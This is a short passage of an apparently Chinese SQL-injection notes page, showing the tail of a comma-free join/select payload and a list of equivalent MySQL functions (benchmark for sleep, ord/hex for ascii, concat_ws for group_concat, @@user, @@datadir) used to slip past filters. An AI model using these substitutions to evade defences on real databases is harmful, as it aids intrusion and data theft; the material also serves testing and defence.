<span class="hljs-number">2</span>)b <span class="hljs-keyword">join</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">3</span>)c;<br></code></pre></td></tr></table></figure>
 
-</li>
-</ul>
 <h3 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h3><p>实质是找等价函数</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">sleep() <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> benchmark()<br>ascii() <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> ord()、hex()、bin() #不一定用ascii码，也可转为其他进制；但ord()于ascii()对中文处理不同<br>group_concat() <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> concat_ws()<br><span class="hljs-keyword">user</span>() <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> @<span class="hljs-variable">@user</span>  #全局变量<br>datadir <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> @<span class="hljs-variable">@datadir</span> #全局变量<br></code></pre></td></tr></table></figure>
+
             </div>
             <hr>
             <div>
